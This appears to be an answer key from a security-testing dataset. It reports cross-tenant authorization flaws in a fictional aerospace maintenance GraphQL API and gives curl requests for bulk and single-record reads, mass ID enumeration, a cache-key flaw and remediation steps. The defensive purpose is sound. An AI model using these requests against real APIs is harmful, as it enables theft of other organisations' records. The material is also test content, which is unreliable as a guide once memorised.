# Expected Response

## System
- System: WingTech Maintenance Portal v3.2.5
- Domain: AEROSPACE / MRO
- Example ID: GQL-0426
- Risk ID: RISK-GQL-426

## Findings

### 1. Pattern 1.9 — Batch/Bulk Lookup Without Per-ID Ownership Check: `bulkResourceLookup` (HAR Primary)

The `bulkResourceLookup` mutation is documented to accept arbitrary IDs without per-ID ownership filtering (Section 4.0). An attacker can include cross-tenant resource IDs in a single bulk request, harvesting maintenance records belonging to multiple aircraft operators in a single API call. In Aerospace/MRO, this exposes airworthiness records, maintenance logs, and component compliance data across operator boundaries.

HAR shows `bulkResourceLookup(ids: ["R-2426", "R-1426", "R-3426"])` from `tenant-9953` returning data for `tenant-5ea8` (response wrapper shows `getResource` — synthetic artifact; cross-tenant `tenantId` confirms bypass).

```bash
curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9953>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-9953" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2426\", \"R-1426\", \"R-3426\"]) { resourceId tenantId ownerId data { sensitiveField internalNotes auditLog { ... on AuditEntry { action } } } } }"}'
```
**Vulnerable outcome:** Returns records from multiple tenants including `tenantId: "tenant-5ea8"` — cross-tenant MRO data exposed in bulk.

### 2. Single-ID Cross-Tenant Maintenance Record Read — `getResource` (RISK-GQL-426)

```bash
curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9953>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-9953" \
  -d '{"query": "query { getResource(id: \"R-2426\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-5ea8"`, `sensitiveField: "CONFIDENTIAL-99535ea8"` — MRO maintenance record exposed.

### 3. Redis Cache Maintenance Record Leak

Cache key is `resourceId` only. Another operator's cached maintenance/compliance record can be served to a competing operator.

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9953>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-9953" \
  -d '{"query": "query { getResource(id: \"R-1426\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns `tenantId: "tenant-9953"`.

**Step 2 — Bulk cross-tenant MRO lookup (primary HAR attack):**
```bash
curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9953>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-9953" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2426\", \"R-1426\", \"R-3426\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns records from multiple tenants.

**Step 3 — Escalate batch size for mass enumeration:**
```bash
curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9953>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-9953" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2426\",\"R-2427\",\"R-2428\",\"R-2429\",\"R-2430\",\"R-2431\",\"R-2432\",\"R-2433\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** All 8 records returned from multiple tenants in one request — mass enumeration of Aerospace MRO records.

## Secure Outcome Verification
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": null }
```

## Remediation
- Per-ID ownership filter in `bulkResourceLookup`: post-fetch filter returning only `tenantId === jwtTenantId` items. Silently drop or reject unauthorized IDs.
- Resolver-level tenant check in `getResource`: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` (RISK-GQL-426).
- Rate-limit bulk operations: enforce maximum batch size per request.
- Fix Redis cache key: include `tenantId` (e.g., `resource:{tenantId}:{resourceId}`).
